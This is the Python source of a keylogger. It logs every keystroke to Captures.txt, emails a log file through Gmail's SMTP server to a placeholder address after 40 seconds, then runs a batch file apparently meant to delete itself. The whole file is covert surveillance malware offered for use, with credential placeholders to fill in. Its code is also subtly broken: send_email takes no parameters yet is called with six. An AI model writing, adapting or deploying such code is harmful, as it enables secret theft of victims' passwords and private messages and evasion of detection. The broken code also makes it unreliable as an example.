from pynput import keyboard
import os
import time
import threading
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

# KeyBoard Exception Cases

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.tab':
        letter = ''
    if letter == 'Key.alt_l':
        letter = ''
    if letter == 'Key.alt_gr':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.ctrl_r':
        letter = ''
    if letter == 'Key.caps_lock':
        letter = ''
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.home":
        letter = ""
    if letter == "Key.end":
        letter = ""
    if letter == "Key.insert":
        letter = ""
    if letter == "Key.delete":
        letter = ""
    if letter == "Key.esc":
        letter = ""
    if letter == "Key.print_screen":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

# Function Key Exception Cases
    if letter == "Key.f1":
        letter = ""
    if letter == "Key.f2":
        letter = ""
    if letter == "Key.f3":
        letter = ""
    if letter == "Key.f4":
        letter = ""
    if letter == "Key.f5":
        letter = ""
    if letter == "Key.f6":
        letter = ""
    if letter == "Key.f7":
        letter = ""
    if letter == "Key.f8":
        letter = ""
    if letter == "Key.f9":
        letter = ""
    if letter == "Key.f10":
        letter = ""
    if letter == "Key.f11":
        letter = ""
    if letter == "Key.f12":
        letter = ""

# Arrow Key Exception Cases
    if letter == "Key.right":
        letter = ""
    if letter == "Key.left":
        letter = ""
    if letter == "Key.up":
        letter = ""
    if letter == "Key.down":
        letter = ""


    with open("Captures.txt", 'a') as f:
        f.write(letter)


def start_keylogger():
    # Collecting events until stopped
    print("Keylogger Running...")
    with keyboard.Listener(on_press=write_to_file) as l:
        l.join()

def execute_bat_after_delay(bat_file_path, delay_seconds):
    # delay_seconds = delay_minutes * 60
    print(f"Waiting for {delay_seconds} seconds...")
    time.sleep(delay_seconds)
    # Send the email
    print(f"Uploading Log, Please wait...")
    send_email(subject, body, to_email, attachment_path, sender_email, sender_password)
    # Launch Bat File
    print(f"Executing {bat_file_path}...")
    subprocess.call([bat_file_path], shell=True)
    

def send_email():
     # Set up the MIME
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = to_email
    message["Subject"] = subject

    # Attach the body to the email
    message.attach(MIMEText(body, "plain"))

    # Attach the file to the email
    attachment = open(attachment_path, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {attachment_path}")
    message.attach(part)

    # Connect to the SMTP server (in this case, Gmail's SMTP server)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    # Log in to the Gmail account
    server.login(sender_email, sender_password)

    # Send the email
    server.sendmail(sender_email, to_email, message.as_string())

    # Close the connection
    server.quit()

# Replace the following variables with your own information
subject = "Keylogger File"
body = "Attachment file capture.txt"
to_email = "recipient@example.com"
attachment_path = "path/to/your/file.txt"
sender_email = "your@gmail.com"
sender_password = "your_gmail_password"



# Set the path to your batch file
batch_file_path = r'C:\self_del.bat'
    
# Set the delay time in Seconds
delay_seconds = 40
    


keylogger_thread = threading.Thread(target=start_keylogger)
countdown_thread = threading.Thread(target=execute_bat_after_delay, args=(batch_file_path, delay_seconds))

keylogger_thread.start()
countdown_thread.start()

keylogger_thread.join()
countdown_thread.join()


